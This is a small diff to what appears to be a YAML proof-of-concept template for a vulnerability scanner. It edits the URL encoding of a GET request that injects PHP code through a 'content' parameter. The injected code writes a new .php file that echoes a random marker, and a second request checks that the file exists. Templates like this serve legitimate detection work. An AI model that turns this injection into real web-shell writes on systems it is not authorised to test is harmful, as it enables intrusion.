@@ -4,7 +4,7 @@ set:
   r1: randomInt(1000000000, 2000000000)
 rules:
   - method: GET
-    path: "/index.php?a=fetch&content=%3C?php+file_put_contents(%22{{r}}.php%22,%22%3C?php+echo+{{r1}};%22);"
+    path: "/index.php?a=fetch&content=%3C?php+file_put_contents(%22{{r}}.php%22,%22%3C?php+echo+{{r1}}%3B%22)%3B"
     expression: "true"
   - method: GET
     path: "/{{r}}.php"
